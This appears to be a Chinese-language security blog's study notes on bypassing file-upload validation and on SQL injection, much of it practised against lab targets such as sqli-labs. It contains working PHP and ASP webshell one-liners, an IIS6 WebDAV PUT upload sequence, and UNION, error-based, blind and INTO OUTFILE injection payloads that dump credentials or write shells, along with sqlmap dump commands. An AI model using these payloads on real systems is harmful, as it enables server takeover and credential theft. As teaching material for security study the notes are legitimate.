<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="绕过前端JS验证的文件上传"><a href="#绕过前端JS验证的文件上传" class="headerlink" title="绕过前端JS验证的文件上传"></a>绕过前端JS验证的文件上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Burpsuite去除JS验证</span><br><span class="line">在Burpsuite的Proxy功能项的option下，有一个remove all javascripts选项，勾选上。</span><br><span class="line">或者浏览器直接禁用JS脚本执行。</span><br><span class="line"></span><br><span class="line">2.浏览器审计工具去除JS验证</span><br><span class="line">利用浏览器的审查工具去除JS之后，保存为新文件然后进行文件上传。</span><br><span class="line">打开审查工具界面，找到onsubmit&#x3D;&quot;return checkfile()&quot;</span><br><span class="line"></span><br><span class="line">3.上传webshell，菜刀连接</span><br></pre></td></tr></table></figure>
<h2 id="绕过MIME-Type验证的文件上传"><a href="#绕过MIME-Type验证的文件上传" class="headerlink" title="绕过MIME-Type验证的文件上传"></a>绕过MIME-Type验证的文件上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.MIME-Type</span><br><span class="line">MIME：多用途互联网邮件扩展类型。设定某种扩展名的文件用一种应用程序来打开的方式类型，当扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</span><br><span class="line">多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</span><br><span class="line"></span><br><span class="line">常见文件的MIME-Type：</span><br><span class="line">PDF文档.pdf</span><br><span class="line">Microsoft word文件：.word</span><br><span class="line">PNG图像.png  image&#x2F;png</span><br><span class="line">GIF图像.gif  image&#x2F;gif</span><br><span class="line">JPEG图形.jpeg .jpg image&#x2F;jpeg</span><br><span class="line">au声音文件.au  audio&#x2F;basic</span><br><span class="line">MIDI音乐文件mid .midi  audio&#x2F;midi,audio&#x2F;x-midi</span><br><span class="line">RealAudio音乐文件.ra  .ram  audio&#x2F;x-pn-realaudio</span><br><span class="line">MPEG文件.mpg .mpeg  video&#x2F;mpeg</span><br><span class="line">AVI文件 .avi video&#x2F;x-msvideo</span><br><span class="line">用到时浏览器查询即可</span><br><span class="line"></span><br><span class="line">2.Burpsuite绕过MIME-Type验证</span><br><span class="line">上传1.php</span><br><span class="line">利用Burpsuite截断HTTP请求，在Repeter(或者中间的content-Type)重放修改MIME-Type类型绕过验证。</span><br><span class="line">修改为符合要求的MIME-Type：image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">3.菜刀连接</span><br><span class="line">上传webshell，菜刀连接</span><br><span class="line">一句话木马：&lt;?php @eval($_POST[&#39;cmd&#39;];?)&gt;</span><br><span class="line">技巧：可通过右键查看上传图片属性，获取上传webshell的地址，进行连接。</span><br></pre></td></tr></table></figure>
<h2 id="绕过黑名单限制的文件上传"><a href="#绕过黑名单限制的文件上传" class="headerlink" title="绕过黑名单限制的文件上传"></a>绕过黑名单限制的文件上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.基于文件后缀名的验证</span><br><span class="line">分类：</span><br><span class="line">基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功</span><br><span class="line">基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</span><br><span class="line"></span><br><span class="line">2.Burpsuite绕过验证</span><br><span class="line">先以.jpg等符合的后缀名上传，再使用Burpsuite截断HTTP请求，再修改文件后缀名，或利用intruder模块进行枚举后缀名，寻找黑名单没有过滤的后缀名。</span><br><span class="line">PhP</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">phtml</span><br><span class="line"></span><br><span class="line">3.上传webshell，菜刀连接</span><br></pre></td></tr></table></figure>
<h2 id="htaccess绕过进行文件上传"><a href="#htaccess绕过进行文件上传" class="headerlink" title=".htaccess绕过进行文件上传"></a>.htaccess绕过进行文件上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1..htaccess文件</span><br><span class="line">htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置。</span><br><span class="line">通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line">其中.htaccess文件内容：</span><br><span class="line">SetHander application&#x2F;x-httpd-php</span><br><span class="line">设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则会报错。</span><br><span class="line"></span><br><span class="line">当在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来设置使用php解析任意文件。文件内容：SetHander application&#x2F;x-httpd-php</span><br><span class="line"></span><br><span class="line">2.配置文件http.conf</span><br><span class="line">在Apache中如果需要启动.htaccess，必须在http.conf中设置AllowOverride</span><br><span class="line"></span><br><span class="line">3.制作图片马phpinfo探针并上传</span><br><span class="line">使用文本编辑工具写入phpinfo探针：</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">保存为1.jpg进行上传即可</span><br></pre></td></tr></table></figure>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.大小写绕过原理</span><br><span class="line">windows系统下，对于文件名中的大小写不敏感。例如test.php和test.PhP是一样的。</span><br><span class="line">Linux系统下，对于文件名中的大小写敏感。例如test.php和test.PhP是不一样的。</span><br><span class="line"></span><br><span class="line">2.修改后缀名大小写绕过</span><br><span class="line">直接修改后缀名大小写混合的，进行上传。</span><br><span class="line"></span><br><span class="line">3.WeBaCoo上传webshell</span><br><span class="line">使用WeBaCoo生成webshell：webacoo -g -o a.php</span><br></pre></td></tr></table></figure>
<h2 id="空格绕过黑名单"><a href="#空格绕过黑名单" class="headerlink" title="空格绕过黑名单"></a>空格绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.空格绕过</span><br><span class="line">window系统下，对于文件中空格会被当作空处理，程序中的检测代码不能自动删除空格，从而绕过黑名单。</span><br><span class="line"></span><br><span class="line">2.绕过验证</span><br><span class="line">使用Burpsuite工具截断HTTP请求，对上传的文件名后加空格。</span><br></pre></td></tr></table></figure>
<h2 id="号绕过黑名单"><a href="#号绕过黑名单" class="headerlink" title=".号绕过黑名单"></a>.号绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1..号绕过</span><br><span class="line">windows系统下，文件后缀名最后一个.会被自动去除。</span><br><span class="line"></span><br><span class="line">2.绕过黑名单验证</span><br><span class="line">使用Burpsuite工具截断HTTP请求，上传文件加.绕过上传。</span><br><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure>
<h2 id="特殊符号绕过黑名单"><a href="#特殊符号绕过黑名单" class="headerlink" title="特殊符号绕过黑名单"></a>特殊符号绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.特殊符号绕过原理：</span><br><span class="line">windows系统下，如果上传的文件名中test.php::$DATA会在服务器中生成test.php文件，内容和所上传文件内容相同，并被解析。</span><br><span class="line"></span><br><span class="line">2.直接上传1.php::$DATA</span><br><span class="line">在Linux下修改文件名为1.php::$DATA进行上传</span><br></pre></td></tr></table></figure>
<h2 id="路径拼接绕过黑名单"><a href="#路径拼接绕过黑名单" class="headerlink" title="路径拼接绕过黑名单"></a>路径拼接绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.路径拼接绕过原理</span><br><span class="line">服务器没有对用户上传的文件进行重命名的情况下，用户可以自定义文件名，并上传新建，就会造成绕过。</span><br><span class="line"></span><br><span class="line">2.绕过黑名单验证</span><br><span class="line">在Linux下修改文件名，上传1.php..文件</span><br></pre></td></tr></table></figure>
<h2 id="双写绕过黑名单"><a href="#双写绕过黑名单" class="headerlink" title="双写绕过黑名单"></a>双写绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.双写绕过</span><br><span class="line">代码编写过程中，只对黑名单中的内容进行空替换,因为只替换一次造成双写绕过。</span><br><span class="line">phphpp</span><br></pre></td></tr></table></figure>
<h2 id="00截断绕过白名单"><a href="#00截断绕过白名单" class="headerlink" title="%00截断绕过白名单"></a>%00截断绕过白名单</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.%00截断原理</span><br><span class="line">0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符。系统在对文件名读取时，如果遇到0x00时，就会认为读取结束。</span><br><span class="line"></span><br><span class="line">在PHP5.3版本之后的已经修复了00截断。并且00截断受限于GPC、addslasher函数。</span><br><span class="line"></span><br><span class="line">2.GET型%00截断</span><br><span class="line">GET型提交的内容会被自动进行URL编码，前提是GPC是关闭的。</span><br><span class="line">在拼接路径后面1.php%00: ..&#x2F;upload&#x2F;1.php%00</span><br><span class="line"></span><br><span class="line">3.POST型%00截断</span><br><span class="line">在POST请求中，%00不会被自动解码，在burpsuite中选择HEX编码形式进行修改00</span><br></pre></td></tr></table></figure>
<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.图片马</span><br><span class="line">在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合规范，通过查看文件二进制格式的前几个字节，从而判断文件类型是否正确。</span><br><span class="line">在前面添加GIF98A即可。</span><br><span class="line"></span><br><span class="line">2.上传</span><br><span class="line">在上传过程中可能有content-Type验证，修改为image&#x2F;gif或image&#x2F;jpg,使其符合当前文件类型的MIME-Type.</span><br><span class="line"></span><br><span class="line">3.文件包含漏洞</span><br><span class="line">在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当作PHP代码执行，无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。</span><br><span class="line"></span><br><span class="line">4.结合文件包含输出phpinfo</span><br><span class="line">利用存在文件包含的PHP页面，包含上传的图片webshell，从而触发webshell，输出相应的phpinfo。</span><br></pre></td></tr></table></figure>
<h2 id="条件竞争上传"><a href="#条件竞争上传" class="headerlink" title="条件竞争上传"></a>条件竞争上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.文件上传过程</span><br><span class="line">服务器获取文件---&gt;保存上传临时文件---&gt;重命名移动临时文件</span><br><span class="line"></span><br><span class="line">2.条件竞争原理</span><br><span class="line">网站逻辑：</span><br><span class="line">(1)网站允许上传任意文件，然后检查上传文件是否包含webshell，如果包含删除该文件。</span><br><span class="line">(2)网站允许上传任意文件，但如果不是指定类型，使用unlink删除文件。</span><br><span class="line">在删除之前访问上传的php文件，从而执行上传文件中的php代码。</span><br><span class="line"></span><br><span class="line">3.条件竞争上传利用</span><br><span class="line">上传前不断访问代码文件，然后上传。</span><br><span class="line">Python发送http请求：</span><br><span class="line">import requests</span><br><span class="line">while true：</span><br><span class="line">   request.get(&quot;路径&quot;)</span><br><span class="line"></span><br><span class="line">写入webshell：</span><br><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])？&gt;&#39;)</span><br></pre></td></tr></table></figure>
<h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.IIS6.0解析漏洞</span><br><span class="line">（1）当建立*.asa、 *.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件解析。</span><br><span class="line">（2）文件*.asp;1.jpg 会被IIS6.0当作asp文件解析。</span><br><span class="line"></span><br><span class="line">2.IIS6.0 PUT上传原理</span><br><span class="line">IIS6.0集成了 WebDAV功能模块，基于HTTP1.1协议的通信协议使得HTTP支持PUT、MOVE、COPY、DELETE方法。</span><br><span class="line"></span><br><span class="line">3.IIS6.0 PUT上传探测</span><br><span class="line">(1)探测是否存在：</span><br><span class="line">OPTIONS &#x2F;HTTP 1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line"></span><br><span class="line">(2)上传txt文本文件：</span><br><span class="line">PUT &#x2F;a.txt HTTP1.1</span><br><span class="line">Host：www.xxx.com</span><br><span class="line">Content-Length:30</span><br><span class="line">&lt;%eval request(&quot;chopper&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">(3)通过MOVE或Copy重命名：</span><br><span class="line">COPY &#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line">Destinstion:</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp;a.jpg</span><br><span class="line"></span><br><span class="line">(4)删除原txt</span><br><span class="line">DELETE &#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line"></span><br><span class="line">可以使用工具nikto进行探测：</span><br><span class="line">nikto -h IP地址</span><br><span class="line"></span><br><span class="line">4.IIS6.0 PUT上传利用</span><br><span class="line">利用Burpsuite进行IIS PUT漏洞利用</span><br><span class="line"></span><br><span class="line">5.IIS6.0解析文件类型</span><br><span class="line">IIS6.0默认可执行的文件除了asp还包括：</span><br><span class="line">&#x2F;.asa</span><br><span class="line">&#x2F;.cer</span><br><span class="line">&#x2F;.cdx</span><br><span class="line"></span><br><span class="line">6.漏洞修复</span><br><span class="line">阻止上传xxx.asp;.jpg类型的文件名；</span><br><span class="line">做好权限设置。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2020/08/01/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语言分类：解释型语言和编译型语言</span><br><span class="line">解释型语言：在运行时边解释边执行的语言。</span><br><span class="line">编译型语言：代码一次编译，以后都可以直接执行。</span><br><span class="line"></span><br><span class="line">在解释型语言中，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。</span><br><span class="line"></span><br><span class="line">cms逻辑：</span><br><span class="line">index.php首页展示内容，具有文章列表（链接具有文章id）、artcles.php文章详细页，URL中article.php？id&#x3D;文章id读取id文章。</span><br><span class="line"></span><br><span class="line">SQL注入验证：</span><br><span class="line">‘单引号闭合字符串型</span><br><span class="line">and1&#x3D;1  and1&#x3D;2 闭合数字型</span><br></pre></td></tr></table></figure>
<h2 id="mysql注入知识"><a href="#mysql注入知识" class="headerlink" title="mysql注入知识"></a>mysql注入知识</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Mysql5.x数据结构：</span><br><span class="line"></span><br><span class="line">在Mysql5.0及以上的版本中，为方便管理，默认定义了information_schema元数据库，用来存储数据库元信息。其中具有表schemata（数据库名）、tables（表名）、columns（列名或字段名）。</span><br><span class="line">在schemata表中，schema_name字段用来存储数据库名</span><br><span class="line">在tables表中，table_schema和table_name分别用来存储数据库名和表名</span><br><span class="line">在columns表中，table_schema（数据库名）、table_name（表名）、column_name（字段名）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.mysql增删改查</span><br><span class="line">SELECT 列名 from 表名  where 字段1&#x3D;’条件1‘ and 字段2&#x3D;’条件2‘</span><br><span class="line">INSERT INTO table_name（列1，列2。。）VALUES（值1，值2.。。。）</span><br><span class="line">UPDATE 表名称 SET 列名称&#x3D;新值  WHERE 列名称&#x3D;某值</span><br><span class="line">DELETE FROM  表名称 WHERE 列名称&#x3D;值</span><br><span class="line"></span><br><span class="line">显示数据库：show database；</span><br><span class="line">进入某一数据库：use 数据库名；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.Mysql常用函数：</span><br><span class="line">mysql常用的聚合函数：</span><br><span class="line">user()：查看当前mysql登录用户名</span><br><span class="line">database()：查看当前使用的mysql数据库名</span><br><span class="line">version():查看当前mysql版本</span><br><span class="line"></span><br><span class="line">limlit关键字：</span><br><span class="line">limit m，n：从m行开始，到m+n行（走几行）。</span><br><span class="line"></span><br><span class="line">在mysql中常用的注释符：#或--空格或&#x2F;**&#x2F;</span><br><span class="line">空格的编码为%20</span><br><span class="line">内联注释：&#x2F;*！SQL语句*&#x2F;  只有MySQL可以识别，常用来绕WAF</span><br><span class="line">使用内联注释注入：select * from articles where id&#x3D;-1&#x2F;*!union*&#x2F;&#x2F;*!select *&#x2F;1,2,3,4</span><br></pre></td></tr></table></figure>
<h2 id="sqli注入靶场搭建"><a href="#sqli注入靶场搭建" class="headerlink" title="sqli注入靶场搭建"></a>sqli注入靶场搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.phpstudy环境安装</span><br><span class="line">phpstudy是一个PHP调试环境的程序集成包。</span><br><span class="line">该程序包集成最新的Apache+PHP+Mysql+phpmyadmin+Zendoptimizer，一次性安装，无需配置即可使用，学习PHP只需一个集成包。</span><br><span class="line">下载地址：http:&#x2F;&#x2F;phpstudy.php.cn</span><br><span class="line"></span><br><span class="line">2.火狐浏览器插件</span><br><span class="line">火狐浏览器采用Gecko排版引擎，支持多种操作系统。</span><br><span class="line">安全方面的插件：</span><br><span class="line">hackbar、Firebug、Live http headers（查看请求响应的HTTP数据包）、Tamper data</span><br><span class="line"></span><br><span class="line">3.sqlmap安装</span><br><span class="line">sqlmap是一款强大的SQL注入漏洞检测和利用工具。官方网站：http:&#x2F;&#x2F;www.sqlmap.org&#x2F;</span><br><span class="line">sqlmap为python语言编写的工具。需要先安装python环境，安装时add to path添加到系统变量里。</span><br><span class="line"></span><br><span class="line">windows下搭建sqlmap:</span><br><span class="line">下载好程序，cd相应目录，python sqlmap.py即可启动</span><br><span class="line"></span><br><span class="line">4.sqli-Lab安装</span><br><span class="line">Sqli-labs是一个印度程序员写的，使用php进行编写的，用来练习sql注入的。</span><br><span class="line">下载：https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs</span><br><span class="line">下载好打开sql-connection&#x2F;db-creds.inc，修改默认数据库连接密码。</span><br><span class="line">切换phpstudy至5.3版本可解决PDO剔除报错。</span><br></pre></td></tr></table></figure>
<h2 id="GET基于报错的SQL注入"><a href="#GET基于报错的SQL注入" class="headerlink" title="GET基于报错的SQL注入"></a>GET基于报错的SQL注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.SQL注入的分类</span><br><span class="line">根据注入位置数据类型可将SQL注入分为两类：数字型和字符型</span><br><span class="line">数字型：select * from table where id&#x3D;用户输入id</span><br><span class="line">字符型：select * from table where id&#x3D;&#39;用户输入的id&#39;</span><br><span class="line"></span><br><span class="line">通过在URL中修改对应的ID值，为正常数字、字符（单引号、双引号、单双引号、括号）、反斜杠\来探测URL中是否存在注入点。</span><br><span class="line">’单引号URL编码后为%27</span><br><span class="line"></span><br><span class="line">2.GET基于报错的SQL注入的发现</span><br><span class="line">id&#x3D;1‘   先让mysql报错，然后进行闭合：id&#x3D;1’）--+</span><br><span class="line">id&#x3D;1‘’  先让mysql报错，然后进行闭合：id&#x3D;1&#39;&#39;）--%20</span><br><span class="line"></span><br><span class="line">3.利用</span><br><span class="line">利用order by判断字段数</span><br><span class="line">注入位置分析：</span><br><span class="line">select username,passwd from admin where id&#x3D;&#39;id&#39; order by 10--+&#39; limit 0,1</span><br><span class="line"></span><br><span class="line">利用union select联合查询，获取表名</span><br><span class="line">0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where </span><br><span class="line">table_schema&#x3D;database()--+</span><br><span class="line">0&#39;是为了让mysql报错，爆出可以利用的位置。</span><br><span class="line"></span><br><span class="line">利用union select联合查询，获取字段名</span><br><span class="line">0&#39; union select 1,group_conact(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line">利用union select联合查询，获取字段值</span><br><span class="line">0’ union select 1,group_conact(username,0x3a,passwd),3 from users--+</span><br><span class="line"></span><br><span class="line">4.sqlmap工具</span><br><span class="line">python sqlmap.py -u &#39;http:&#x2F;&#x2F;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --dbs --batch</span><br><span class="line">-D:查询数据库</span><br><span class="line">-T:查询相应数据库的表</span><br><span class="line">--columns：查询相应表的字段</span><br></pre></td></tr></table></figure>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.什么是盲注</span><br><span class="line">注入攻击的一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果。这种攻击的出现是因为应用程序为只显示常规错误，并没有解决SQL注入存在的代码问题。</span><br><span class="line"></span><br><span class="line">当利用SQL注入进行攻击，web应用程序会显示，后端数据库SQL查询返回的错误信息。而若数据库没有输出数据到web界面，而通过询问一些列的true和false问题，强制从数据库获取数据。</span><br><span class="line"></span><br><span class="line">2.GET基于时间的盲注</span><br><span class="line">if(ascii(substr(database(),1,1)&#x3D;115,1,sleep(3)))</span><br><span class="line">当数据库名第一个字母的ascii码等于115时，执行一次sleep(3)函数等待3秒</span><br><span class="line">网页上检查元素，查看网络的返回时间。</span><br><span class="line"></span><br><span class="line">3.GET基于Boolean的盲注</span><br><span class="line">基于布尔型的盲注，通常采用下面方法猜解字符串：</span><br><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1))&gt;N;</span><br><span class="line">select ascii(substr(database(),1,1))&#x3D;N;</span><br><span class="line">select ascii(substr(database(),1,1))&lt;N;</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行盲注</span><br><span class="line">时间盲注：</span><br><span class="line">python sqlmap.py -u &#39;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --technique -T </span><br><span class="line">布尔盲注：</span><br><span class="line">python sqlmap.py -u &#39;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --technique -B</span><br></pre></td></tr></table></figure>
<h2 id="mysql注入读写文件"><a href="#mysql注入读写文件" class="headerlink" title="mysql注入读写文件"></a>mysql注入读写文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.mysql注入读文件</span><br><span class="line">读取前提：</span><br><span class="line">用户权限足够大，最好是root权限；</span><br><span class="line">secure_file_priv不为NULL</span><br><span class="line"></span><br><span class="line">使用方法：select load_file(’具体文件路径‘)</span><br><span class="line">因为联合查询只能输出一条，需要使其报错，出错位置表示可以在相应的位置查询数据。</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,load_file(F:\\flag.txt),3 --+</span><br><span class="line"></span><br><span class="line">2.mysql注入写文件</span><br><span class="line">前提：</span><br><span class="line">权限允许写入</span><br><span class="line">set globle general_log &#x3D;on </span><br><span class="line"></span><br><span class="line">写入方法：into outfile ‘具体路径，要用双\\，因为mysql会对\进行转义’</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39;)),1,&#39;&lt;?php phpinfo;?&gt;&#39;,3 into outfile &#39;E:\\phpstudy\\www\\sqli\\less7\\1.php&#39;--+</span><br><span class="line"></span><br><span class="line">3.写入webshell</span><br><span class="line">写入一句话木马，然后使用菜刀进行连接。</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39;)) union select 1，&#39;&lt;?php @eval($_POST[&#39;x&#39;];？&gt;)&#39;,3  into outfile &#39;C:\\phpstudy\\php\\www\\sqli\\less7\\2.php&#39;--+</span><br><span class="line"></span><br><span class="line">4.使用sqlmap</span><br><span class="line">读文件：</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;?id&#x3D;1&quot; --flie-read &quot;E:\\flag.txt&quot;</span><br><span class="line">写文件：</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;?id&#x3D;1&quot; --file-write &quot;&#x2F;root&#x2F;1.php&quot; --file-dest &quot;F:\\1.php&quot;</span><br></pre></td></tr></table></figure>
<h2 id="POST时间与布尔盲注"><a href="#POST时间与布尔盲注" class="headerlink" title="POST时间与布尔盲注"></a>POST时间与布尔盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.POST</span><br><span class="line">POST发送数据给服务器处理，数据包含HTTP信息正文中。</span><br><span class="line">POST请求会向指定资源提交数据，请求服务器进行处理，如表单数据、文件上传等，请求数据会被包含在请求体中。</span><br><span class="line">POST方法可能会创建新的资源和修改现有资源。</span><br><span class="line">使用POST方法时，查询字符串在POST信息中单独存在，和HTTP请求一起发送到服务器</span><br><span class="line">POST &#x2F;xxx.xxx.html HTTP&#x2F;1.1</span><br><span class="line">Host：xxx.xxx.com</span><br><span class="line"></span><br><span class="line">2.POST时间盲注</span><br><span class="line">在POST提交的参数后加and if(length(database())&gt;5,sleep(5),null)</span><br><span class="line">如果执行的页面响应时间大于5秒，则存在注入。</span><br><span class="line">例子：</span><br><span class="line">uname&#x3D;admin&#39; and（select(if(length(database())&gt;5,sleep(5),null))）--+ &amp;passwd&#x3D;1234&amp;submit&#x3D;submit</span><br><span class="line">可以观察到响应速度明显慢</span><br><span class="line"></span><br><span class="line">3.POST布尔盲注</span><br><span class="line">在存在注入点POST提交的参数后加入if判断正确或错误的语句。</span><br><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1))&gt;N;</span><br><span class="line">例子：</span><br><span class="line">uname&#x3D;admin&#39; and（length(database())&gt;5)--+ &amp;passwd&#x3D;1234</span><br></pre></td></tr></table></figure>
<h2 id="POST基于错误注入"><a href="#POST基于错误注入" class="headerlink" title="POST基于错误注入"></a>POST基于错误注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Burpsuite抓取HTTP请求</span><br><span class="line">Burpsuite需要安装JAVA环境，同时在浏览器设置本机局域网代理。</span><br><span class="line"></span><br><span class="line">2.POST基于错误单引号注入</span><br><span class="line">在登录界面抓取用户名、密码后，点击send to repeter</span><br><span class="line">输入\使其报错，看报错内容，闭合前面并注释掉后面</span><br><span class="line">POST的内容为：uname&#x3D;admin&amp; passwd&#x3D;1234 &amp;submit&#x3D;submit</span><br><span class="line">注入为：uname&#x3D;admin &amp;passwd&#x3D;1234&#39; or 1&#x3D;1--+ &amp;submit&#x3D;submit</span><br><span class="line"></span><br><span class="line">3.POST基于错误双引号注入、</span><br><span class="line">输入\使其报错，看报错内容，闭合前面并注释后面</span><br><span class="line">POST内容为uname&#x3D;admin &amp;passwd&#x3D;1234 </span><br><span class="line">注入为: uname&#x3D;admin &amp;passwd&#x3D;1234&#39;&#39;) or 1&#x3D;1--+</span><br><span class="line"></span><br><span class="line">4.使用sqlmap POST注入</span><br><span class="line">方法：</span><br><span class="line">复制Burpsuite截断的HTTP请求数据包到文本文件中，使用sqlmap -r 文件路径 -p 指定探测参数</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r test.txt -p passwd --technique E </span><br><span class="line">&#x2F;&#x2F;指定对passwd参数进行基于错误注入</span><br><span class="line">python sqlmap.py -r test.txt -p passwd --technique E --current-db</span><br><span class="line">&#x2F;&#x2F;查看当前使用的数据库名称</span><br><span class="line">python sqlmap.py -r test.txt -p passwd -D security --tables </span><br><span class="line">&#x2F;&#x2F;探测指定数据库的表</span><br><span class="line">python sqlmap.py -r test.txt -p passwd -D security -T user --columns </span><br><span class="line">&#x2F;&#x2F;探测user表中的字段</span><br><span class="line">pyhton sqlmap.py -r test.txt -p passwd -D security -T user -C &quot;username,passwd&quot; --dump</span><br><span class="line">&#x2F;&#x2F;探测指定字段username及passwd的内容</span><br></pre></td></tr></table></figure>
<h2 id="GET报错注入-双注入"><a href="#GET报错注入-双注入" class="headerlink" title="GET报错注入-双注入"></a>GET报错注入-双注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.GET报错注入</span><br><span class="line">报错注入形式上是两个嵌套的查询，即select....(select....)，里面的被称为子查询，顺序是先执行子查询，然后再执行外面的select。</span><br><span class="line">双注入主要涉及的函数：</span><br><span class="line">rand()随机函数，返回0-1之间的某个值</span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数</span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数</span><br><span class="line">group by clause分组语句，按照查询结果分组</span><br><span class="line">通过报错来显示具体的信息</span><br><span class="line"></span><br><span class="line">查询的时候如果使用rand()的话，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中，floor(rand(0)*2)的值是定性的，为011011</span><br><span class="line">payload示例：</span><br><span class="line">slect count(*) from table group by floor(rand(0)*2)</span><br><span class="line"></span><br><span class="line">2.GET单引号报错注入</span><br><span class="line">获取数据库：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select conact(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a)limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">获取表名：</span><br><span class="line">xxx.xxx.com?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select conact(table_name,0x3a,0x3a)from information_schema.tables where table_schema&#x3D;database()limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">获取用户信息：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,3 from(select count(*),concat((select concat(usename,0x3a,0x3a,passwd,0x3a,0x3a)from 